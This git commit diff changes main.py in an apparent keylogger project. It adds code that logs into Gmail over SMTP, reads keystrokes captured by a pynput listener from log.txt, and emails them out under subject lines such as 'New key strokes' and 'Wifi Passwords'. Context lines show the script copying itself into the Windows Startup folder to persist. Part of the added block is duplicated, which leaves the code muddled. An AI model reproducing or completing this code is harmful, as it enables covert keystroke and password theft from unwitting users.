210a1b45fffe80ba151d61e65fe19c0c6a5351ec
Mubashir Hasan <mubashirhasan716@gmail.com>
2021-01-27 12:00:03 +0530

    removed unnecessary

--- main.py
+++ main.py
@@ -1,15 +1,8 @@
-import socket
-
-def is_connected():
-    try:
-        # connect to the host -- tells us if the host is actually
-        # reachable
-        socket.create_connection(("1.1.1.1", 53))
-        return True
-    except OSError:
-        pass
-    return False
-
+import smtplib
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
 
 # config for getting secrets from env
 import os
@@ -17,6 +10,39 @@ from dotenv import load_dotenv
 
 load_dotenv()
 # config ends
+
+# cauz i am using gmail
+server = smtplib.SMTP("smtp.gmail.com", 587)
+server.starttls()
+
+server.ehlo()
+
+server.login(os.getenv("Email"), os.getenv("Password"))
+
+msg = MIMEMultipart()
+msg["From"] = "Your Wifi Password Extractor"
+msg["To"] = "Mohammed Mubashir Hasan"
+msg["Subject"] = "Wifi Passwords"
+
+# config for getting secrets from env
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
+# config ends
+
+# cauz i am using gmail
+server = smtplib.SMTP("smtp.gmail.com", 587)
+server.starttls()
+
+server.ehlo()
+
+server.login(os.getenv("Email"), os.getenv("Password"))
+
+msg = MIMEMultipart()
+msg["From"] = "Your realLogger"
+msg["To"] = "Mohammed Mubashir Hasan"
+msg["Subject"] = "New key strokes"
 
 # now back to the keylogger
 from pynput.keyboard import Listener
@@ -29,10 +55,16 @@ copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Star
 
 logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
-with open("log.txt", "w") as f:
-    secret = f.writelines('')
+with open("log.txt", "r") as f:
+    secret = f.read()
+    msg.attach(MIMEText(secret, "plain"))
 
 # sending reports
+
+
+text = msg.as_string()
+
+server.sendmail(os.getenv("Email"), os.getenv("SendEmail"), text)
 
 
 # back to keylogging
